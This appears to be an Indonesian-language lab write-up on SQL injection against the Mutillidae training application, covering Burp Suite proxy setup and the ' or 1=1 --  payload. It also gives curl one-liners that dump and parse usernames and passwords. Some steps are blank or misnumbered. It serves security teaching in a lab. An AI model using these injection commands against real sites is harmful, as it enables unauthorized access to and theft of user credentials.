# Lesson 5 : SQL Injection, Burpsuite, cURL, Perl Parser

## Start Web Browser Session to Multillidae
- Buka browser kemudian akses Multillidae sesuai ip metasploit pada alamat http://10.0.1.100/mutillidae
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/start_browser.png "Home page")

## Go To User Info Page
1. Go to User Info
	- 

## Configure Firefox Proxy Settings
1. View Preferences
- Edit --> Preferences
2. Advanced Settings
   - Pilih Menu Advanced
   - Pilih Network Tabs
   - Pilih Settings
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/network_tab.png "Home page")
3. Connection Settings
   - Gunakan manual proxy
   - Pada kolom HTTP Proxy isikan **127.0.0.1**
   - Pada kolom Port **8080**
   - Centang bagian Use the proxy server for all protocols 
   - Klik Ok, Kemudian Close
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/set_config_proxy.png "Home page")

## Configure Burpsuite Settings
1. Buka Aplikasi Burpsuite
   - Akan muncul halaman aplikasi, pilih next
   - Use Burp defaults, kemudian klik start Burp
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/use_default.png "Home page")
2. Configure proxy
   - Pilih tab proxy, kemudian options
   - Set port ke 8080 seperti berikut
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/proxy_port_8080.png "Home page")
3. Turn on intercept
   - Pilih tab intercept
   - Pastikan intercept button dalam keadaan off "intercept is off"
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/intercept_off.png "Home page")

## SQL Injection: Obtain Userlist (Method #1)
1. Obtain Userlist Without Password
   - Pada kolom Textbox **Name** isikan **`' or 1=1 -- `**
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik View Account
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/.png "Home page")
2. View Results
	- Halaman selanjutnya akan memuat kumpulan data table account yang berupa username, password dan signature
	- Perhatikan string yang ada pada url yang di hightlight '+or+1%3D1--+
2. View Post Data (With Burp Suite)
   - Klik pada Tab Proxy
   - Klik pada Tab History
   - Klik cari line yang urlnya mengandung **/mutillidae/index.php?page=user-info.php** dengan Method GET
   - Klik pada Tab Request
   - Klik pada Tab Raw
   - Perhatikan isi string pada username, string tersbut  akan digunakan untuk melancarkan serangan
   - Perbedaan string tersebut dengan string yang sebelumnya adalah %27 setelah single quote(')
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result.png "Home page")
   - Highligt text, kemudian klik kanan
   - Klik "Copy to File" 
5. Save File
   - Save file di dalam folder **root**
   - File Name: **crack_cookies2.txt**
   - Klik tombol Save
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/save_burp.png "Home page")

## Simulate CURL SQL Injection: (Method #2)
1. Use Curl to Display Usernames and Passwords
 - Buka terminal, jalankan perintah berikut : 
 ```
 curl -b crack_cookies2.txt -c crack_cookies2.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'
 ```

## Perl Parser
 - Buka terminal, jalankan perintah berikut :
 ```
	cd /root
	curl -b crack_cookies2.txt -c crack_cookies2.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep "Username=" > lesson7.txt
	cat lesson7.txt
 ```